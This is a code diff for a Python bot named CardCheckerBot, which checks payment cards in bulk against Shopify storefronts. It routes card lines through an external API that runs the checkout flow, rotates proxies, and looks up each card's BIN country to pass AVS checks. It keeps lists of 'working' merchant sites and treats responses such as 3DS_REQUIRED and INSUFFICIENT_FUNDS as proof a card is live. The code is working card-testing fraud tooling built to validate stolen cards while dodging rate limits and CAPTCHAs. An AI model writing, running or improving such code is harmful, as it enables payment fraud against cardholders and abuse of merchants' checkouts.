-        if filtered:
-            self.working_sites = list(filtered)
-            self.site_index = 0
-            logger.info(f"[filter] Filter '{amount_filter}': {len(filtered)} precomputed sites applied")
-            return
-
-        # FIX: If precomputed list is empty, don't fall back — just keep empty and let user know
-        self.working_sites = []
-        self.site_index = 0
-        logger.warning(f"[filter] Filter '{amount_filter}': no sites match. Run /test_sites to populate.")
-
-    def precompute_filtered_sites(self):
-        """Precompute filtered site lists using cached prices (instant, no API calls).
-        Called after /test_sites completes. Populates self.filtered_sites.
-        FIX: Uses ONLY self.working_sites (strict test results), NOT good_sites or owner_sites."""
-        # FIX: Use only self.working_sites — the sites that passed the strict API test
-        base_sites = list(self.working_sites)
-        self.filtered_sites = {"all": list(base_sites), "low": [], "medium": [], "high": [], "vhigh": []}
-
-        no_price_count = 0
+        # FIX: Filter sites using ONLY cached prices — no live API calls
+        filtered = []
+        skipped_no_cache = 0
         for site in base_sites:
             price = self._site_price_cache.get(site, 0.0)
-            if price <= 0:
-                no_price_count += 1
-                continue
-            if price < 5:
-                self.filtered_sites["low"].append(site)
-            if 5 <= price <= 10:
-                self.filtered_sites["medium"].append(site)
-            if 10 < price <= 20:
-                self.filtered_sites["high"].append(site)
-            if price > 20:
-                self.filtered_sites["vhigh"].append(site)
+            if price > 0:
+                if self._is_price_in_filter(price, amount_filter):
+                    filtered.append(site)
+            else:
+                # No cached price — exclude from filtered list (warn, don't fetch)
+                skipped_no_cache += 1
 
-        if no_price_count > 0:
-            logger.warning(f"[precompute] {no_price_count} sites have no cached price — kept in 'all' only")
+        if skipped_no_cache > 0:
+            logger.warning(f"[filter] {skipped_no_cache} sites have no cached price — run /test_sites to populate cache")
 
-        logger.info(
-            f"[precompute] Filtered sites (from {len(base_sites)} working): all={len(self.filtered_sites['all'])}, "
-            f"low={len(self.filtered_sites['low'])}, medium={len(self.filtered_sites['medium'])}, "
-            f"high={len(self.filtered_sites['high'])}, vhigh={len(self.filtered_sites['vhigh'])}"
-        )
+        self.working_sites = filtered if filtered else base_sites
+        self.site_index = 0
+        logger.info(f"[filter] Filter '{amount_filter}': {len(filtered)} sites matched out of {len(base_sites)}")
 
     async def prefetch_site_prices(self):
         """Pre-fetch cheapest product prices for all working sites using the API with a test card.
         Populates self._site_price_cache for instant amount filtering."""
-        # FIX: Use only self.working_sites, not good_sites
-        sites = list(self.working_sites)
+        sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
         if not sites:
             return
         uncached = [s for s in sites if s not in self._site_price_cache]
@@ -1447,21 +1188,27 @@ class CardCheckerBot:
         logger.info(f"[prefetch] Price cache: {cached_count}/{len(sites)} sites have prices")
 
     async def _fetch_product_price_fallback(self, site: str) -> float:
-        """Fallback: scrape cheapest product price via /products.json if API fails."""
+        """Fallback: scrape cheapest product price via /products.json if API fails.
+        Scans up to 250 products to find the true minimum price."""
         try:
             shop_url = self.normalize_site_url(site)
-            url = f"{shop_url}/products.json?limit=1"
+            url = f"{shop_url}/products.json?limit=250"
             session = await self.get_http_session()
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                 if resp.status == 200:
                     data = await resp.json(content_type=None)
                     products = data.get("products", [])
-                    if products:
-                        variants = products[0].get("variants", [])
-                        if variants:
-                            prices = [float(v.get("price", "0")) for v in variants if v.get("price")]
-                            if prices:
-                                return min(prices)
+                    min_price = float('inf')
+                    for product in products:
+                        for variant in product.get("variants", []):
+                            try:
+                                p = float(str(variant.get("price", "0")).replace(',', ''))
+                                if p > 0 and p < min_price:
+                                    min_price = p
+                            except (ValueError, TypeError):
+                                pass
+                    if min_price < float('inf'):
+                        return min_price
         except Exception:
             pass
         return 0.0
@@ -1472,13 +1219,7 @@ class CardCheckerBot:
                                             proxy_str: Optional[str] = None) -> ShopifyCheckResult:
         """Call the Flask API at SHOPIFY_API_URL for card checking.
         The API handles the entire Shopify GraphQL checkout flow internally.
-        SCALABLE: Wrapped with global_api_semaphore to limit concurrent API calls.
         Returns ShopifyCheckResult with mapped status."""
-        async with self.global_api_semaphore:
-            return await self._run_shopify_graphql_checkout_inner(card_line, shop_url, proxy_str)
-
-    async def _run_shopify_graphql_checkout_inner(self, card_line: str, shop_url: str,
-                                                   proxy_str: Optional[str] = None) -> ShopifyCheckResult:
         start_time = time.time()
         site_name = shop_url.replace("https://", "").replace("http://", "")
 
@@ -1487,61 +1228,22 @@ class CardCheckerBot:
         if proxy_str:
             params["proxy"] = proxy_str
 
-        # BIN-BASED ADDRESS: Look up card country from BIN and pass to API for better AVS matching
-        try:
-            cc_number = card_line.split("|")[0].strip()
-            bin_info = await self.get_bin_info(cc_number[:6])
-            if bin_info and isinstance(bin_info, dict):
-                country_data = bin_info.get("country", {})
-                if isinstance(country_data, dict):
-                    alpha2 = country_data.get("alpha2")
-                    if alpha2:
-                        params["bin_country"] = alpha2
-        except Exception:
-            pass  # BIN lookup failure is non-critical
-
         try:
             session = await self.get_http_session()
             timeout = aiohttp.ClientTimeout(total=SHOPIFY_API_TIMEOUT)
-            # Send API key header when SHOPIFY_API_KEY env var is set (backward compatible)
-            req_headers = {}
-            _shopify_api_key = os.environ.get("SHOPIFY_API_KEY")
-            if _shopify_api_key:
-                req_headers["X-API-Key"] = _shopify_api_key
-            async with session.get(SHOPIFY_API_URL, params=params, headers=req_headers, timeout=timeout) as resp:
+            async with session.get(SHOPIFY_API_URL, params=params, timeout=timeout) as resp:
                 elapsed = time.time() - start_time
 
                 if resp.status != 200:
                     error_text = await resp.text()
                     logger.warning(f"[API] {site_name} | HTTP {resp.status} | {elapsed:.2f}s | {error_text[:100]}")
-                    # STABLE: HTTP 402 = permanent decline (payment required), not retryable
-                    is_402 = resp.status == 402
-                    # HTTP 429 = rate limited, retryable on different site
-                    is_429 = resp.status == 429
-                    if is_402:
-                        return ShopifyCheckResult(
-                            card=card_line, status=ShopifyCheckStatus.DECLINED,
-                            status_code=f"HTTP_{resp.status}", site_name=site_name,
-                            shop_url=shop_url, gateway="SHOPIFY-RELOADED",
-                            error_msg=f"API returned HTTP {resp.status}",
-                            retryable=False, site_dead=False,
-                        )
-                    elif is_429:
-                        return ShopifyCheckResult(
-                            card=card_line, status=ShopifyCheckStatus.ERROR,
-                            status_code=f"HTTP_{resp.status}", site_name=site_name,
-                            shop_url=shop_url, gateway="SHOPIFY-RELOADED",
-                            error_msg=f"Rate limited (HTTP 429)",
-                            retryable=True, site_dead=False,
-                        )
-                    else:
-                        return ShopifyCheckResult(
-                            card=card_line, status=ShopifyCheckStatus.ERROR,
-                            status_code=f"HTTP_{resp.status}", site_name=site_name,
-                            shop_url=shop_url, gateway="SHOPIFY-RELOADED",
-                            error_msg=f"API returned HTTP {resp.status}",
-                            retryable=resp.status >= 500, site_dead=resp.status == 404,
-                        )
+                    return ShopifyCheckResult(
+                        card=card_line, status=ShopifyCheckStatus.ERROR,
+                        status_code=f"HTTP_{resp.status}", site_name=site_name,
+                        shop_url=shop_url, gateway="SHOPIFY-RELOADED",
+                        error_msg=f"API returned HTTP {resp.status}",
+                        retryable=resp.status >= 500, site_dead=resp.status == 404,
+                    )
 
                 data = await resp.json()
                 elapsed = time.time() - start_time
@@ -1551,7 +1253,6 @@ class CardCheckerBot:
                 api_gateway = data.get("Gateway", "UNKNOWN")
                 api_price = data.get("Price", 0.0)
                 api_cc = data.get("cc", card_line)
-                api_retryable = data.get("retryable", None)  # SCALABLE: API now sends retryable flag
 
                 logger.info(f"[API] {site_name} | {api_response} | gate={api_gateway} | ${api_price} | {elapsed:.2f}s")
 
@@ -1572,31 +1273,23 @@ class CardCheckerBot:
 
                 # Determine status and retryable
                 retryable = False
-                if "CAPTCHA" in response_upper:
+                if "3DS_REQUIRED" in response_upper or "AUTHENTICATION_REQUIRED" in response_upper:
+                    status = ShopifyCheckStatus.APPROVED
+                    # 3DS cards are live – do not treat as declined
+                elif "CAPTCHA" in response_upper:
                     status = ShopifyCheckStatus.ERROR
                     retryable = True
-                    # CAPTCHA sites are temporarily blocked (not permanently dead)
-                    # site_dead=False so the CAPTCHA retry path in shopify_check_card handles it
+                    site_dead = True
+                elif "RATE_LIMIT" in response_upper or "429" in response_upper:
+                    status = ShopifyCheckStatus.ERROR
+                    retryable = True
                     site_dead = False
                 elif site_dead:
                     status = ShopifyCheckStatus.ERROR
                     retryable = True
-                # GRACEFUL: MERCHANDISE_EXPECTED_PRICE_MISMATCH = price changed, retry on different site
-                elif "MERCHANDISE_EXPECTED_PRICE_MISMATCH" in response_upper:
-                    status = ShopifyCheckStatus.ERROR
-                    retryable = True
-                # GRACEFUL: Expired card = permanent card error, no retry
-                elif "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in response_upper or "EXPIRED_CARD" in response_upper:
-                    status = ShopifyCheckStatus.DECLINED
-                    retryable = False
-                # FIX: GENERIC_ERROR = retryable ERROR (not DECLINED) — could be temporary site issue
                 elif "GENERIC_ERROR" in response_upper:
-                    status = ShopifyCheckStatus.ERROR
-                    retryable = True
-                # FIX: 3DS_REQUIRED from API means card is valid (requires 3DS auth) — treat as APPROVED
-                # API returns Status=false for 3DS, so check BEFORE api_status guard
-                elif "3DS_REQUIRED" in response_upper:
-                    status = ShopifyCheckStatus.APPROVED
+                    # GENERIC_ERROR must NEVER be treated as APPROVED
+                    status = ShopifyCheckStatus.DECLINED
                 elif api_status and any(kw in response_upper for kw in [
                     "ORDER_PLACED", "PROCESSED_RECEIPT",
                 ]):
@@ -1607,28 +1300,13 @@ class CardCheckerBot:
                     "APPROVED",
                 ]):
                     status = ShopifyCheckStatus.APPROVED
-                # FIX: INSUFFICIENT_FUNDS with Status=false still means card is valid
-                elif not api_status and "INSUFFICIENT_FUNDS" in response_upper:
-                    status = ShopifyCheckStatus.APPROVED
                 elif "TIMEOUT" in response_upper or "CONNECTION" in response_upper:
-                    status = ShopifyCheckStatus.ERROR
-                    retryable = True
-                # GRACEFUL: 429 rate limiting in response body = retry on different site
-                elif "429" in response_upper or "RATE_LIMIT" in response_upper or "THROTTL" in response_upper:
-                    status = ShopifyCheckStatus.ERROR
-                    retryable = True
-                # GRACEFUL: DELIVERY_DELIVERY_LINE_DETAIL_CHANGED = delivery option changed, not a card issue — retry on different site
-                elif "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in response_upper:
                     status = ShopifyCheckStatus.ERROR
                     retryable = True
                 else:
                     # Everything else is DECLINED: CARD_DECLINED, DO_NOT_HONOR,
-                    # GENERIC_DECLINE, PAYMENTS_*, unknown, etc.
+                    # DELIVERY_*, GENERIC_DECLINE, PAYMENTS_*, unknown, etc.
                     status = ShopifyCheckStatus.DECLINED
-
-                # SCALABLE: Fallback to API's retryable flag if our mapping didn't set it
-                if not retryable and api_retryable is True and status == ShopifyCheckStatus.ERROR:
-                    retryable = True
 
                 result = ShopifyCheckResult(
                     card=card_line,
@@ -1688,9 +1366,8 @@ class CardCheckerBot:
         Amount filter: only uses sites whose cheapest product price matches the user's filter.
         Returns (raw_text, approved, info) for compatibility with existing callers."""
         if not self.working_sites:
-            # NO FALLBACK: require /test_sites to have been run first
-            logger.error("❌ shopify_check_card: NO working sites available — run /test_sites first")
-            return "No sites", False, {"reason": "No working Shopify sites available. Run /test_sites first.", "site": "none"}
+            logger.error("❌ shopify_check_card: NO tested working sites available")
+            return "No sites", False, {"reason": "No tested working Shopify sites available", "site": "none"}
 
         tried = set()
         last_info: dict = {"reason": "No sites tried", "site": "none"}
@@ -1718,9 +1395,7 @@ class CardCheckerBot:
                         current_proxy = rotated
 
             shop_url = self.normalize_site_url(site)
-            # STABLE: limit concurrent Shopify API calls via semaphore to prevent 429/402
-            async with self.shopify_semaphore:
-                result = await self.run_shopify_graphql_checkout(card_line, shop_url, current_proxy)
+            result = await self.run_shopify_graphql_checkout(card_line, shop_url, current_proxy)
 
             info = {
                 "site": result.site_name,
@@ -1829,28 +1504,23 @@ class CardCheckerBot:
 
     # ── API-based site validator ──
 
-    async def _test_site_via_api(self, shop_url: str, proxy_url: Optional[str] = None) -> dict:
+    async def _test_site_via_api(self, shop_url: str) -> dict:
         """Test a single site by sending a test card to the Flask API.
         A site is WORKING if the API returns any real payment gateway response
         (e.g. CARD_DECLINED, INSUFFICIENT_FUNDS, etc.).
-        Optionally uses a proxy for the API call if provided.
-        Returns dict with 'working' (bool), 'reason' (str), 'site' (str), 'captcha' (bool), 'temporary' (bool)."""
+        Returns dict with 'working' (bool), 'reason' (str), 'site' (str), 'captcha' (bool)."""
         start_time = time.time()
         site_name = shop_url.replace("https://", "").replace("http://", "")
-        out = {"working": False, "reason": "", "site": site_name, "captcha": False, "temporary": False, "gateway": ""}
+        out = {"working": False, "reason": "", "site": site_name, "captcha": False}
 
         try:
             session = await self.get_http_session()
             params = {"site": shop_url, "cc": SHOPIFY_TEST_CARD}
-            # PATIENT: pass proxy to API if available
-            if proxy_url:
-                params["proxy"] = proxy_url
             timeout = aiohttp.ClientTimeout(total=SHOPIFY_TEST_SITE_TIMEOUT)
             async with session.get(SHOPIFY_API_URL, params=params, timeout=timeout) as resp:
                 elapsed = time.time() - start_time
 
                 if resp.status != 200:
-                    # STRICT: All non-200 responses are failures (no temporary category)
                     out["reason"] = f"HTTP {resp.status} after {elapsed:.1f}s"
                     return out
 
@@ -1859,15 +1529,8 @@ class CardCheckerBot:
                 api_status = data.get("Status", False)
                 api_gateway = data.get("Gateway", "UNKNOWN")
                 response_upper = api_response.upper() if api_response else ""
-                out["gateway"] = api_gateway
 
                 logger.info(f"[site-test] {site_name} | {api_response} | gate={api_gateway} | {elapsed:.1f}s")
-
-                # FIX: 429/rate-limit in response body = TEMPORARY (unstable), not dead
-                if "429" in response_upper or "RATE_LIMIT" in response_upper or "THROTTL" in response_upper:
-                    out["reason"] = f"Rate limited: {api_response}"
-                    out["temporary"] = True  # Mark as unstable, not permanently dead
-                    return out
 
                 # CAPTCHA detection
                 if "CAPTCHA" in response_upper:
@@ -1875,26 +1538,31 @@ class CardCheckerBot:
                     out["reason"] = f"CAPTCHA ({api_response})"
                     return out
 
-                # Dead site markers — permanently dead (not fixable)
+                # Temporary rate-limit / overload signals — retry later, do not mark dead
+                if "RATE_LIMIT" in response_upper or "429" in response_upper:
+                    out["temporary"] = True
+                    out["reason"] = f"Temporary: {api_response}"
+                    return out
+
+                # Dead site markers
                 dead_markers = [
                     "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
                     "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
                     "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
-                    "GENERIC_ERROR",
-                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
-                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
                 ]
                 for marker in dead_markers:
                     if marker in response_upper:
                         out["reason"] = f"Dead: {api_response}"
                         return out
 
-                # FIX: TIMEOUT/CONNECTION/503 = temporary, not dead — mark unstable for retry
-                temp_markers = ["TIMEOUT", "CONNECTION", "503"]
-                for marker in temp_markers:
+                # BAD site markers: responses that mean the site is not useful for checking
+                bad_markers = [
+                    "GENERIC_ERROR", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
+                ]
+                for marker in bad_markers:
                     if marker in response_upper:
-                        out["reason"] = f"Temporary: {api_response}"
-                        out["temporary"] = True
+                        out["reason"] = f"Bad: {api_response}"
+                        out["bad_site"] = True
                         return out
 
                 # GOOD markers: real payment gateway responses that confirm site processes payments
@@ -1906,7 +1574,7 @@ class CardCheckerBot:
                     "TRANSACTION_NOT_ALLOWED",
                     "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
                     "3DS_AUTHENTICATION", "3D_SECURE", "AUTHENTICATION_REQUIRED",
-                    "ACTION_REQUIRED", "3DS_REQUIRED",
+                    "ACTION_REQUIRED",
                 ]
                 if any(m in response_upper for m in good_markers):
                     out["working"] = True
@@ -1938,153 +1606,110 @@ class CardCheckerBot:
         except asyncio.TimeoutError:
             elapsed = time.time() - start_time
             out["reason"] = f"Timeout ({elapsed:.1f}s)"
-            out["temporary"] = True  # FIX: timeout = temporary, not dead
             return out
         except aiohttp.ClientError as e:
             out["reason"] = f"Connection error: {str(e)[:60]}"
-            out["temporary"] = True  # FIX: connection error = temporary, not dead
             return out
         except Exception as e:
             out["reason"] = f"Error: {type(e).__name__}: {str(e)[:60]}"
             return out
 
-    async def test_sites_graphql(self, sites: Optional[List[str]] = None, progress_callback=None) -> Tuple[List[str], List[str]]:
-        """PATIENT site testing with exponential backoff for 429/503.
-        Uses the Flask API with a test card. Concurrency=2, delay=3s between sites.
-        A site is WORKING ONLY if the API returns a real payment gateway response.
-        429/503/timeout = UNSTABLE (retested later with backoff), NOT dead.
-        Permanently dead markers = DEAD immediately.
-        Saves working sites to working_sites.txt and prices to site_prices.json."""
+    async def test_sites_graphql(self, sites: Optional[List[str]] = None) -> Tuple[List[str], List[str]]:
+        """Test all sites CONCURRENTLY using the Flask API with a test card. Returns (working, dead) lists.
+        Uses asyncio.gather with semaphore for fast parallel testing.
+        503/timeout errors get SITE_TEST_RETRIES retries before marking dead.
+        CAPTCHA sites are NOT counted as working.
+        Also classifies GOOD sites (real payment responses only, no GENERIC_ERROR/DELIVERY_*)."""
         sites_to_test = sites or list(self.owner_sites)
         working = []
         good_sites = []
         dead = []
-        unstable = []  # FIX: sites that got 429/503/timeout — will be retried with backoff
+        captcha_sites = []
         failure_reasons = {}
-        sem = asyncio.Semaphore(SITE_TEST_CONCURRENCY_LIMIT)  # FIX: concurrency=2
+        sem = asyncio.Semaphore(SITE_TEST_CONCURRENCY_LIMIT)
         results_lock = asyncio.Lock()
-        _tested_count = [0]
-        _total_sites = len(sites_to_test)
 
         async def test_one_site(site):
             async with sem:
-                try:
-                    shop_url = self.normalize_site_url(site)
-
-                    # FIX: Exponential backoff for 429/503/timeout — up to SITE_TEST_RETRIES attempts
-                    for attempt in range(SITE_TEST_RETRIES + 1):
+                shop_url = self.normalize_site_url(site)
+                last_reason = "unknown"
+                # Try up to SITE_TEST_RETRIES + 1 times for 503/timeout errors
+                for attempt in range(SITE_TEST_RETRIES + 1):
+                    try:
                         result = await self._test_site_via_api(shop_url)
-
                         if result.get("working"):
-                            # Site returned a real payment gateway response — WORKING
                             async with results_lock:
                                 working.append(site)
                                 if result.get("good"):
                                     good_sites.append(site)
-                                price = result.get("price", 0.0)
-                                if price and price > 0:
-                                    self._site_price_cache[site] = float(price)
-                                else:
-                                    fallback_price = await self._fetch_product_price_fallback(site)
-                                    if fallback_price and fallback_price > 0:
-                                        self._site_price_cache[site] = fallback_price
-                                # Cache gateway for this site
-                                gw = result.get("gateway", "")
-                                if gw:
-                                    self._site_gateway_cache[site] = gw
-                            logger.info(f"✅ {site} → WORKING ({result.get('reason', '')})")
+                                    price = result.get("price", 0.0)
+                                    if price and price > 0:
+                                        self._site_price_cache[site] = float(price)
+                            logger.info(f"✅ {result['site']} → WORKING{' (GOOD)' if result.get('good') else ''} ({result.get('reason', '')})")
                             return
-
-                        if result.get("temporary"):
-                            # FIX: 429/503/timeout — retry with exponential backoff
+                        elif result.get("captcha"):
+                            async with results_lock:
+                                captcha_sites.append(site)
+                                failure_reasons[site] = f"CAPTCHA: {result.get('reason', 'captcha detected')}"
+                            logger.info(f"⚠️ {result['site']} → CAPTCHA (temporary skip)")
+                            return
+                        elif result.get("temporary"):
+                            last_reason = result.get("reason", "temporary error")
                             if attempt < SITE_TEST_RETRIES:
-                                delay = SITE_TEST_BACKOFF_DELAYS[min(attempt, len(SITE_TEST_BACKOFF_DELAYS) - 1)]
-                                logger.info(f"⏳ {site} → TEMPORARY ({result.get('reason', '')}) — retry {attempt+1}/{SITE_TEST_RETRIES} after {delay}s")
-                                await asyncio.sleep(delay)
+                                await asyncio.sleep(SITE_TEST_RETRY_DELAY)
                                 continue
-                            else:
-                                # All retries exhausted — mark as UNSTABLE, not dead
-                                async with results_lock:
-                                    unstable.append(site)
-                                    failure_reasons[site] = f"UNSTABLE: {result.get('reason', 'unknown')} (after {SITE_TEST_RETRIES} retries)"
-                                    self.unstable_sites[site] = time.time()
-                                logger.info(f"⚠️ {site} → UNSTABLE ({result.get('reason', 'unknown')}) — will retest later")
-                                return
-
-                        if result.get("captcha"):
-                            # CAPTCHA — mark dead temporarily
+                            async with results_lock:
+                                failure_reasons[site] = last_reason
+                            logger.info(f"⚠️ {result['site']} → TEMPORARY ({last_reason})")
+                            return
+                        elif result.get("bad_site"):
                             async with results_lock:
                                 dead.append(site)
-                                failure_reasons[site] = result.get("reason", "CAPTCHA")
-                            logger.info(f"❌ {site} → DEAD (CAPTCHA)")
+                                failure_reasons[site] = result.get("reason", "bad site")
+                            logger.info(f"⚠️ {result['site']} → BAD SITE ({result.get('reason', '')})")
                             return
-
-                        # Permanent failure — DEAD immediately, no retries
+                        else:
+                            last_reason = result.get("reason", "unknown")
+                            # Check if it's a temporary error — retry with delay
+                            reason_str = last_reason.lower()
+                            if any(kw in reason_str for kw in ["503", "timeout", "connection error", "429", "rate limit", "temporary"]):
+                                if attempt < SITE_TEST_RETRIES:
+                                    await asyncio.sleep(SITE_TEST_RETRY_DELAY)
+                                    continue
+                            # Not a retryable error — retry once more then give up
+                            if attempt == 0:
+                                await asyncio.sleep(1)
+                                continue
+                            # All retries exhausted
+                            async with results_lock:
+                                dead.append(site)
+                                failure_reasons[site] = last_reason
+                            logger.info(f"❌ {result['site']} → DEAD after {attempt + 1} attempts ({last_reason})")
+                            return
+                    except Exception as e:
+                        last_reason = f"exception: {str(e)[:60]}"
+                        if attempt < SITE_TEST_RETRIES:
+                            await asyncio.sleep(SITE_TEST_RETRY_DELAY)
+                            continue
                         async with results_lock:
                             dead.append(site)
-                            failure_reasons[site] = result.get("reason", "unknown")
-                        logger.info(f"❌ {site} → DEAD ({result.get('reason', 'unknown')})")
+                            failure_reasons[site] = last_reason
+                        logger.info(f"❌ {site} → DEAD ({last_reason})")
                         return
 
-                except Exception as e:
-                    async with results_lock:
-                        dead.append(site)
-                        failure_reasons[site] = f"exception: {str(e)[:60]}"
-                    logger.info(f"❌ {site} → DEAD (exception: {str(e)[:60]})")
-                finally:
-                    # FIX: 3s delay between sites to avoid flooding the API
-                    await asyncio.sleep(3.0)
-                    # Progress callback
-                    async with results_lock:
-                        _tested_count[0] += 1
-                        if progress_callback and _tested_count[0] % 5 == 0:
-                            latest_status = "✅" if site in working else ("⚠️" if site in unstable else "❌")
-                            site_country = self._country_from_domain(site)
-                            site_price = self._site_price_cache.get(site, 0.0)
-                            site_gateway = self._site_gateway_cache.get(site, "")
-                            try:
-                                await progress_callback(
-                                    _tested_count[0], _total_sites,
-                                    len(working), len(dead), len(unstable),
-                                    site, latest_status,
-                                    site_country, site_price, site_gateway
-                                )
-                            except Exception:
-                                pass
-
-        # Run all site tests concurrently (limited by semaphore)
+        # Run all site tests concurrently
         tasks = [test_one_site(site) for site in sites_to_test]
         await asyncio.gather(*tasks, return_exceptions=True)
 
-        # Save working sites to working_sites.txt (primary)
-        with open("working_sites.txt", "w") as f:
+        # Save working sites to file
+        with open("working_sites_api.txt", "w") as f:
             f.write("\n".join(working))
         # Save GOOD sites (strict: real payment responses only)
         with open("good_sites_api.txt", "w") as f:
             f.write("\n".join(good_sites))
-        # Also save to legacy filenames for compatibility
-        with open("working_sites_api.txt", "w") as f:
-            f.write("\n".join(working))
-        # Save site price cache to JSON for persistence across restarts
-        if self._site_price_cache:
-            try:
-                with open("site_prices.json", "w") as f:
-                    json.dump(self._site_price_cache, f)
-                logger.info(f"📝 Saved {len(self._site_price_cache)} site prices to site_prices.json")
-            except Exception as e:
-                logger.warning(f"⚠️ Failed to save site_prices.json: {e}")
-        logger.info(
-            f"📝 PATIENT test complete: {len(working)} working, {len(dead)} dead, "
-            f"{len(unstable)} unstable (will retest later)"
-        )
-
-        # Persist dead sites to dead_sites.json (only permanently dead, NOT unstable)
-        for d in dead:
-            self.dead_sites.add(d)
-        self._save_dead_sites_to_file()
-
-        # FIX: Do NOT clear unstable sites — they will be retested later
-        # self.unstable_sites.clear()  # REMOVED: unstable sites are preserved for retest
+        logger.info(f"📝 Site test complete: {len(working)} working, {len(good_sites)} GOOD, ({len(captcha_sites)} CAPTCHA), {len(dead)} dead")
+        logger.info(f"📝 Saved {len(working)} working sites to working_sites_api.txt")
+        logger.info(f"📝 Saved {len(good_sites)} good sites to good_sites_api.txt")
 
         # Log top failure reasons summary
         if failure_reasons:
@@ -2098,119 +1723,32 @@ class CardCheckerBot:
 
         return working, dead
 
-    async def test_sites_lightweight(self, sites: Optional[List[str]] = None) -> Tuple[List[str], List[str]]:
-        """LIGHTWEIGHT site testing: ONE attempt per site, NO retries, NO backoff.
-        Semaphore=2 (only 2 sites concurrently), 1.5s delay between sites.
-        Saves working sites to working_sites.txt and prices to site_prices.json.
-        Returns (working, dead) lists."""
-        sites_to_test = sites or list(self.owner_sites)
-        working = []
-        good_sites = []
-        dead = []
-        failure_reasons = {}
-        sem = asyncio.Semaphore(2)  # SLOW & SAFE: only 2 concurrent site tests
-        results_lock = asyncio.Lock()
-
-        async def test_one_site(site):
-            async with sem:
-                try:
-                    # ONE attempt — no retries, no backoff
-                    result = await self.test_site_lightweight(site)
-
-                    if result.get("working"):
-                        async with results_lock:
-                            working.append(site)
-                            if result.get("good"):
-                                good_sites.append(site)
-                            price = result.get("price", 0.0)
-                            if price and price > 0:
-                                self._site_price_cache[site] = float(price)
-                        logger.info(f"✅ {site} → WORKING (price=${result.get('price', 0):.2f})")
-                    else:
-                        # Any failure = DEAD, no unstable category, no retry
-                        async with results_lock:
-                            dead.append(site)
-                            failure_reasons[site] = result.get("reason", "unknown")
-                        logger.info(f"❌ {site} → DEAD ({result.get('reason', 'unknown')})")
-                except Exception as e:
-                    async with results_lock:
-                        dead.append(site)
-                        failure_reasons[site] = f"exception: {str(e)[:60]}"
-                    logger.info(f"❌ {site} → DEAD (exception: {str(e)[:60]})")
-                finally:
-                    # 1.5s delay between sites to avoid rate limiting
-                    await asyncio.sleep(1.5)
-
-        tasks = [test_one_site(site) for site in sites_to_test]
-        await asyncio.gather(*tasks, return_exceptions=True)
-
-        # Save results to working_sites.txt (primary) and site_prices.json
-        with open("working_sites.txt", "w") as f:
-            f.write("\n".join(working))
-        if self._site_price_cache:
-            try:
-                with open("site_prices.json", "w") as f:
-                    json.dump(self._site_price_cache, f)
-                logger.info(f"📝 Saved {len(self._site_price_cache)} site prices to site_prices.json")
-            except Exception as e:
-                logger.warning(f"⚠️ Failed to save site_prices.json: {e}")
-
-        logger.info(f"📝 Lightweight test (no-retry): {len(working)} working, {len(dead)} dead")
-
-        # Mark dead sites persistently
-        for d in dead:
-            self.dead_sites.add(d)
-        self._save_dead_sites_to_file()
-
-        if failure_reasons:
-            reason_counts = {}
-            for r in failure_reasons.values():
-                key = r.split("|")[0].strip() if "|" in r else r
-                reason_counts[key] = reason_counts.get(key, 0) + 1
-            logger.info("📊 Failure breakdown:")
-            for reason, count in sorted(reason_counts.items(), key=lambda x: -x[1])[:10]:
-                logger.info(f"   {count}x — {reason}")
-
-        # Also save to legacy filenames for compatibility
-        with open("working_sites_light.txt", "w") as f:
-            f.write("\n".join(working))
-        with open("good_sites_light.txt", "w") as f:
-            f.write("\n".join(good_sites))
-        with open("working_sites_api.txt", "w") as f:
-            f.write("\n".join(working))
-        with open("good_sites_api.txt", "w") as f:
-            f.write("\n".join(good_sites))
-
-        return working, dead
-
     def load_working_sites_from_file(self):
-        """Load tested working sites from working_sites.txt — no fallback to good_sites or owner_sites.
-        FIX: Only uses working_sites.txt as source of truth. Also loads site_prices.json."""
-        # Load cached site prices from site_prices.json (persisted from last test_sites run)
-        if Path("site_prices.json").exists():
-            try:
-                with open("site_prices.json", "r") as f:
-                    prices = json.load(f)
-                if isinstance(prices, dict):
-                    self._site_price_cache.update(prices)
-                    logger.info(f"✅ Loaded {len(prices)} site prices from site_prices.json")
-            except Exception as e:
-                logger.warning(f"⚠️ Failed to load site_prices.json: {e}")
+        """Load tested working sites from working_sites_api.txt (or legacy working_sites_graphql.txt).
+        Also loads good_sites_api.txt if available."""
+        # Load good sites
+        if Path("good_sites_api.txt").exists():
+            with open("good_sites_api.txt", "r") as f:
+                good = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+            if good:
+                self.good_sites = good
+                logger.info(f"✅ Loaded {len(good)} good sites from good_sites_api.txt")
 
-        # FIX: Load ONLY from working_sites.txt — no fallback to good_sites or other files
-        filepath = Path("working_sites.txt")
-        if filepath.exists():
-            with open(filepath, "r") as f:
-                sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-            if sites:
-                # Exclude persisted dead sites
-                sites = [s for s in sites if s not in self.dead_sites]
-                self.working_sites = sites
-                self.site_index = 0
-                logger.info(f"✅ Loaded {len(sites)} working sites from working_sites.txt (excluded {len(self.dead_sites)} dead)")
-                return len(self.working_sites)
-
-        logger.warning("⚠️ No working_sites.txt found. Run /test_sites first.")
+        for filepath_name in ["working_sites_api.txt", "working_sites_graphql.txt"]:
+            filepath = Path(filepath_name)
+            if filepath.exists():
+                with open(filepath, "r") as f:
+                    sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+                if sites:
+                    self.working_sites = sites
+                    self.site_index = 0
+                    logger.info(f"✅ Loaded {len(sites)} working sites from {filepath_name}")
+                    # If good_sites available, prefer them for working list
+                    if self.good_sites:
+                        self.working_sites = list(self.good_sites)
+                        self.site_index = 0
+                        logger.info(f"✅ Using {len(self.good_sites)} good sites as working sites")
+                    return len(self.working_sites)
         return 0
 
     def parse_shopify_response(self, raw: str) -> dict:
@@ -2542,35 +2080,12 @@ class CardCheckerBot:
         return None
 
